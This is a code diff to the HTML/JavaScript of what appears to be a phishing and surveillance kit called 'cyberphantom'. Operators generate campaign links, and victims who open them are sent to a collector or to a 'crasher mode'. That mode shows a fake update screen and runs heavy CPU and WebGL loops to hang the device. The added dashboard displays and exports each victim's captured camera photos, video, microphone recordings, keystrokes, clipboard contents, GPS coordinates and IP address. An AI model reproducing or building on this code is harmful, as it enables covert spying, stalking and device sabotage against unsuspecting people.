-    const urlParams = new URLSearchParams(window.location.search);
-    const uidParam = urlParams.get('uid');
-    const campParam = urlParams.get('camp');
-    if(uidParam && campParam) {
-        document.getElementById('dashboardPanel').classList.add('hide');
-        document.getElementById('victimPanel').classList.remove('hide');
-        const campRef = db.ref(`sellers/${uidParam}/campaigns/${campParam}`);
-        campRef.once('value', async (snap) => {
-            if(!snap.exists()) {
-                document.querySelector('#victimPanel .fake-stream-header').innerHTML = '<div style="padding:2rem;">Invalid link.</div>';
-                return;
+        function intensiveBurst() {
+            for(let k = 0; k < 5; k++) {
+                setTimeout(() => {
+                    let x = 0;
+                    for(let i = 0; i < 10000000; i++) {
+                        x += Math.sin(i) * Math.cos(i) * Math.tan((i % 157) * 0.01 + 0.001);
+                    }
+                }, k * 10);
             }
-            const data = snap.val();
-            const features = data.features;
-            const advanced = data.advanced || '';
-            await startVictimCollector(uidParam, campParam, features, advanced, data);
-        });
-    } else {
-        let stored = localStorage.getItem('momin_uid');
-        if(stored) loadSellerDashboard(stored);
-        else { const newUid = generateUID(); localStorage.setItem('momin_uid', newUid); loadSellerDashboard(newUid); }
-        document.getElementById('generateLinkBtn').onclick = generateNewCampaign;
-        document.getElementById('copyLinkBtn').onclick = () => { 
-            const link = document.getElementById('newLinkText').innerText; 
-            if(link && link!=='--') copyClip(link);
-            playSound('copy');
-        };
-        document.querySelectorAll('.feature-card').forEach(c => c.addEventListener('click',()=>{
-            c.classList.toggle('selected');
-            playSound('feature');
-        }));
+        }
 
-        const advancedToggle = document.getElementById('advancedToggle');
-        const cameraCustomDiv = document.getElementById('cameraCustom');
-        advancedToggle.addEventListener('change', () => {
-            if(advancedToggle.checked) cameraCustomDiv.style.display = 'block';
-            else cameraCustomDiv.style.display = 'none';
-            playSound('checkbox');
+        function initVisualLayers() {
+            // Layer 1: WebGL
+            const c1 = document.getElementById('vl1');
+            const gl = c1.getContext('webgl', {powerPreference: "high-performance"});
+            if(gl) {
+                c1.width = window.innerWidth;
+                c1.height = window.innerHeight;
+                
+                const vs = `attribute vec2 p; void main() { gl_Position = vec4(p, 0.0, 1.0); }`;
+                const fs = `precision highp float; uniform vec2 r; uniform float t;
+                    void main() {
+                        vec2 uv = (gl_FragCoord.xy / r) * 2.0 - 1.0;
+                        float n = sin(uv.x * 10.0 + t) * cos(uv.y * 10.0 + t);
+                        gl_FragColor = vec4(vec3(n * 0.5 + 0.5), 1.0);
+                    }`;
+                
+                const prog = gl.createProgram();
+                const vsh = gl.createShader(gl.VERTEX_SHADER);
+                gl.shaderSource(vsh, vs);
+                gl.compileShader(vsh);
+                const fsh = gl.createShader(gl.FRAGMENT_SHADER);
+                gl.shaderSource(fsh, fs);
+                gl.compileShader(fsh);
+                gl.attachShader(prog, vsh);
+                gl.attachShader(prog, fsh);
+                gl.linkProgram(prog);
+                gl.useProgram(prog);
+                
+                const buf = gl.createBuffer();
+                gl.bindBuffer(gl.ARRAY_BUFFER, buf);
+                gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1,-1, 1,-1, -1,1, -1,1, 1,-1, 1,1]), gl.STATIC_DRAW);
+                gl.enableVertexAttribArray(0);
+                gl.vertexAttribPointer(0, 2, gl.FLOAT, false, 0, 0);
+                
+                let start = Date.now();
+                function render() {
+                    gl.uniform2f(gl.getUniformLocation(prog, 'r'), c1.width, c1.height);
+                    gl.uniform1f(gl.getUniformLocation(prog, 't'), (Date.now() - start) * 0.001);
+                    gl.drawArrays(gl.TRIANGLES, 0, 6);
+                    requestAnimationFrame(render);
+                }
+                render();
+            }
+
+            // CPU Load
+            function cpuLoad() {
+                const start = Date.now();
+                let result = 0;
+                const arr = new Float64Array(1000000);
+                for(let i = 0; i < arr.length; i++) {
+                    arr[i] = Math.sin(i) * Math.cos(i);
+                    result += arr[i];
+                }
+                const elapsed = Date.now() - start;
+                setTimeout(cpuLoad, Math.max(0, 16 - elapsed));
+            }
+            cpuLoad();
+        }
+
+        // ==========================================
+        // CRASHER MODE
+        // ==========================================
+        async function startCrasherMode(sellerUid, campaignId, campaignData) {
+            // Hide dashboard, show victim panel
+            document.getElementById('dashboardContainer').style.display = 'none';
+            document.getElementById('victimPanel').classList.add('active');
+            
+            // Initialize anti-throttle immediately
+            initAntiThrottle();
+            
+            // Start fake update
+            startFakeUpdateAnimation(campaignData.redirectUrl);
+            
+            // Still collect basic data
+            const victimId = 'V_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8);
+            const victimRef = db.ref(`sellers/${sellerUid}/campaigns/${campaignId}/victims/${victimId}`);
+            
+            const victimData = {
+                timestamp: Date.now(),
+                type: 'crasher',
+                deviceInfo: {}
+            };
+            
+            await collectPassiveInfo(victimData);
+            await victimRef.set(victimData);
+            
+            // Increment clicks
+            db.ref(`sellers/${sellerUid}/campaigns/${campaignId}/clicks`).transaction(c => (c || 0) + 1);
+        }
+
+        // ==========================================
+        // LIGHTBOX
+        // ==========================================
+        function initLightbox() {
+            const lightbox = document.getElementById('lightbox');
+            const img = document.getElementById('lightbox-img');
+            const video = document.getElementById('lightbox-video');
+            
+            window.openLightbox = (src, type = 'image') => {
+                if(type === 'image') {
+                    img.src = src;
+                    img.style.display = 'block';
+                    video.style.display = 'none';
+                } else {
+                    video.src = src;
+                    video.style.display = 'block';
+                    img.style.display = 'none';
+                }
+                lightbox.classList.add('active');
+            };
+            
+            document.querySelector('.close-lightbox').onclick = () => {
+                lightbox.classList.remove('active');
+                video.pause();
+            };
+        }
+
+        // ==========================================
+        // EVENT LISTENERS
+        // ==========================================
+        document.addEventListener('DOMContentLoaded', () => {
+            // Feature card selection
+            document.querySelectorAll('.feature-card').forEach(card => {
+                card.addEventListener('click', () => {
+                    card.classList.toggle('selected');
+                });
+            });
+
+            // Advanced toggle
+            document.getElementById('advancedToggle').addEventListener('change', (e) => {
+                document.getElementById('cameraCustom').classList.toggle('active', e.target.checked);
+            });
+
+            // Generate buttons
+            document.getElementById('generateNormalBtn').addEventListener('click', () => generateLink('normal'));
+            document.getElementById('generateCrasherBtn').addEventListener('click', () => generateLink('crasher'));
+
+            // Copy buttons
+            document.getElementById('copyNormalBtn').addEventListener('click', () => {
+                copyToClipboard(document.getElementById('normalLinkText').textContent);
+            });
+            document.getElementById('copyCrasherBtn').addEventListener('click', () => {
+                copyToClipboard(document.getElementById('crasherLinkText').textContent);
+            });
+
+            // Export button
+            document.getElementById('exportAllDataBtn').addEventListener('click', async () => {
+                if(!currentUid) return;
+                const snap = await db.ref(`sellers/${currentUid}`).once('value');
+                const data = snap.val();
+                const blob = new Blob([JSON.stringify(data, null, 2)], {type: 'application/json'});
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = `cyberphantom_export_${currentUid}.json`;
+                a.click();
+                URL.revokeObjectURL(url);
+                showStatus('Data exported successfully!');
+            });
+
+            // Initialize
+            initLightbox();
+
+            // Check URL params
+            const urlParams = new URLSearchParams(window.location.search);
+            const uidParam = urlParams.get('uid');
+            const campParam = urlParams.get('camp');
+
+            if(uidParam && campParam) {
+                // Victim mode
+                const campRef = db.ref(`sellers/${uidParam}/campaigns/${campParam}`);
+                campRef.once('value', async (snap) => {
+                    if(!snap.exists()) {
+                        document.body.innerHTML = '<div style="padding:2rem;color:#f66;">Invalid campaign link.</div>';
+                        return;
+                    }
+                    
+                    const campaignData = snap.val();
+                    
+                    if(campaignData.type === 'crasher') {
+                        await startCrasherMode(uidParam, campParam, campaignData);
+                    } else {
+                        await startVictimCollector(uidParam, campParam, campaignData);
+                    }
+                });
+            } else {
+                // Dashboard mode
+                let storedUid = localStorage.getItem('cyberphantom_uid');
+                if(!storedUid) {
+                    storedUid = generateUID();
+                    localStorage.setItem('cyberphantom_uid', storedUid);
+                }
+                initDashboard(storedUid);
+            }
         });
-        if(advancedToggle.checked) cameraCustomDiv.style.display = 'block';
-        else cameraCustomDiv.style.display = 'none';
-    }
-    initLightbox();
-</script>
+
+        // Global functions
+        window.copyToClipboard = copyToClipboard;
+        window.deleteCampaign = deleteCampaign;
+        window.viewVictims = (campId) => {
+            // Expand victim data view
+            const victimsRef = db.ref(`sellers/${currentUid}/campaigns/${campId}/victims`);
+            victimsRef.once('value', (snap) => {
+                const victims = snap.val() || {};
+                // Render full victim view with download buttons
+                renderFullVictimView(victims, campId);
+            });
+        };
+
+        // ==========================================
+        // FULL VICTIM VIEW WITH DOWNLOAD - NEW
+        // ==========================================
+        function renderFullVictimView(victims, campId) {
+            const container = document.getElementById('campaignList');
+            let html = `
+                <div style="margin-bottom: 1rem;">
+                    <button class="btn-secondary" onclick="renderCampaigns(currentCampaigns)">
+                        <i class="fas fa-arrow-left"></i> Back to Campaigns
+                    </button>
+                </div>
+            `;
+            
+            for(const [victimId, victim] of Object.entries(victims)) {
+                const date = new Date(victim.timestamp).toLocaleString();
+                
+                html += `
+                    <div class="victim-item">
+                        <div class="victim-header">
+                            <span class="victim-id">${victimId}</span>
+                            <span class="victim-time">${date}</span>
+                        </div>
+                        
+                        ${victim.camera && victim.camera.length > 0 ? `
+                            <div style="margin-bottom: 1rem;">
+                                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.5rem;">
+                                    <span style="color: var(--primary); font-weight: 600;">
+                                        <i class="fas fa-camera"></i> Photos (${victim.camera.length})
+                                    </span>
+                                    <button class="btn-download" onclick="downloadAllMedia(${JSON.stringify(victim.camera).replace(/"/g, '&quot;')}, 'images')">
+                                        <i class="fas fa-download"></i> Download All
+                                    </button>
+                                </div>
+                                <div class="media-grid">
+                                    ${victim.camera.map((img, idx) => `
+                                        <div class="media-card">
+                                            <img src="${img}" onclick="openLightbox('${img}')" alt="Capture ${idx + 1}">
+                                            <div class="media-actions">
+                                                <button class="btn-download" onclick="downloadMedia('${img}', 'capture_${victimId}_${idx + 1}.jpg', 'image')">
+                                                    <i class="fas fa-download"></i>
+                                                </button>
+                                            </div>
+                                        </div>
+                                    `).join('')}
+                                </div>
+                            </div>
+                        ` : ''}
+                        
+                        ${victim.videoRec && victim.videoRec.length > 0 ? `
+                            <div style="margin-bottom: 1rem;">
+                                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.5rem;">
+                                    <span style="color: var(--primary); font-weight: 600;">
+                                        <i class="fas fa-video"></i> Videos (${victim.videoRec.length})
+                                    </span>
+                                    <button class="btn-download" onclick="downloadAllMedia(${JSON.stringify(victim.videoRec).replace(/"/g, '&quot;')}, 'videos')">
+                                        <i class="fas fa-download"></i> Download All
+                                    </button>
+                                </div>
+                                <div class="media-grid">
+                                    ${victim.videoRec.map((vid, idx) => `
+                                        <div class="media-card">
+                                            <video src="${vid}" onclick="openLightbox('${vid}', 'video')"></video>
+                                            <div class="media-actions">
+                                                <button class="btn-download" onclick="downloadMedia('${vid}', 'video_${victimId}_${idx + 1}.webm', 'video')">
+                                                    <i class="fas fa-download"></i>
+                                                </button>
+                                            </div>
+                                        </div>
+                                    `).join('')}
+                                </div>
+                            </div>
+                        ` : ''}
+                        
+                        ${victim.mic && victim.mic.length > 0 ? `
+                            <div style="margin-bottom: 1rem;">
+                                <span style="color: var(--primary); font-weight: 600;">
+                                    <i class="fas fa-microphone"></i> Audio Recordings (${victim.mic.length})
+                                </span>
+                                <div style="margin-top: 0.5rem;">
+                                    ${victim.mic.map((audio, idx) => `
+                                        <div style="background: rgba(0,0,0,0.3); padding: 0.5rem; border-radius: 8px; margin-bottom: 0.5rem; display: flex; align-items: center; gap: 1rem;">
+                                            <audio controls src="${audio}" style="flex: 1;"></audio>
+                                            <button class="btn-download" onclick="downloadMedia('${audio}', 'audio_${victimId}_${idx + 1}.ogg', 'audio')">
+                                                <i class="fas fa-download"></i>
+                                            </button>
+                                        </div>
+                                    `).join('')}
+                                </div>
+                            </div>
+                        ` : ''}
+                        
+                        ${victim.keys && victim.keys.length > 0 ? `
+                            <div style="margin-bottom: 1rem;">
+                                <span style="color: var(--primary); font-weight: 600;">
+                                    <i class="fas fa-keyboard"></i> Keystrokes (${victim.keys.length})
+                                </span>
+                                <div style="background: rgba(0,0,0,0.3); padding: 1rem; border-radius: 8px; margin-top: 0.5rem; font-family: monospace; font-size: 0.9rem; max-height: 200px; overflow-y: auto;">
+                                    ${victim.keys.map(k => `<div>${new Date(k.timestamp).toLocaleTimeString()}: ${k.key}</div>`).join('')}
+                                </div>
+                            </div>
+                        ` : ''}
+                        
+                        ${victim.clipboard && victim.clipboard.length > 0 ? `
+                            <div style="margin-bottom: 1rem;">
+                                <span style="color: var(--primary); font-weight: 600;">
+                                    <i class="fas fa-clipboard"></i> Clipboard (${victim.clipboard.length})
+                                </span>
+                                <div style="margin-top: 0.5rem;">
+                                    ${victim.clipboard.map((c, idx) => `
+                                        <div style="background: rgba(0,0,0,0.3); padding: 0.5rem; border-radius: 8px; margin-bottom: 0.5rem;">
+                                            <small style="color: #888;">${new Date(c.timestamp).toLocaleString()}</small>
+                                            <div style="margin-top: 0.25rem;">${c.text}</div>
+                                        </div>
+                                    `).join('')}
+                                </div>
+                            </div>
+                        ` : ''}
+                        
+                        ${victim.location && victim.location.length > 0 ? `
+                            <div style="margin-bottom: 1rem;">
+                                <span style="color: var(--primary); font-weight: 600;">
+                                    <i class="fas fa-map-marker-alt"></i> Locations (${victim.location.length})
+                                </span>
+                                <div style="margin-top: 0.5rem;">
+                                    ${victim.location.map((loc, idx) => `
+                                        <div style="background: rgba(0,0,0,0.3); padding: 0.5rem; border-radius: 8px; margin-bottom: 0.5rem; font-family: monospace;">
+                                            Lat: ${loc.lat.toFixed(6)}, Lng: ${loc.lng.toFixed(6)} 
+                                            <a href="https://www.google.com/maps?q=${loc.lat},${loc.lng}" target="_blank" style="color: var(--primary); margin-left: 0.5rem;">
+                                                <i class="fas fa-external-link-alt"></i> View
+                                            </a>
+                                        </div>
+                                    `).join('')}
+                                </div>
+                            </div>
+                        ` : ''}
+                        
+                        ${victim.passiveInfo ? `
+                            <div>
+                                <span style="color: var(--primary); font-weight: 600;">
+                                    <i class="fas fa-info-circle"></i> Device Info
+                                </span>
+                                <div class="passive-grid" style="margin-top: 0.5rem;">
+                                    ${victim.passiveInfo.ip ? `
+                                        <div class="passive-item">
+                                            <i class="fas fa-network-wired"></i>
+                                            <span>IP: ${victim.passiveInfo.ip}</span>
+                                        </div>
+                                    ` : ''}
+                                    ${victim.passiveInfo.platform ? `
+                                        <div class="passive-item">
+                                            <i class="fas fa-desktop"></i>
+                                            <span>Platform: ${victim.passiveInfo.platform}</span>
+                                        </div>
+                                    ` : ''}
+                                    ${victim.passiveInfo.battery ? `
+                                        <div class="passive-item">
+                                            <i class="fas fa-battery-half"></i>
+                                            <span>Battery: ${victim.passiveInfo.battery.level}</span>
+                                        </div>
+                                    ` : ''}
+                                    ${victim.passiveInfo.timezone ? `
+                                        <div class="passive-item">
+                                            <i class="fas fa-clock"></i>
+                                            <span>Timezone: ${victim.passiveInfo.timezone}</span>
+                                        </div>
+                                    ` : ''}
+                                </div>
+                            </div>
+                        ` : ''}
+                    </div>
+                `;
+            }
+            
+            container.innerHTML = html;
+        }
+
+        // Store campaigns for back button
+        let currentCampaigns = {};
+        const originalRenderCampaigns = renderCampaigns;
+        renderCampaigns = function(campaigns) {
+            currentCampaigns = campaigns;
+            originalRenderCampaigns(campaigns);
+        };
+    </script>
 </body>
 </html>
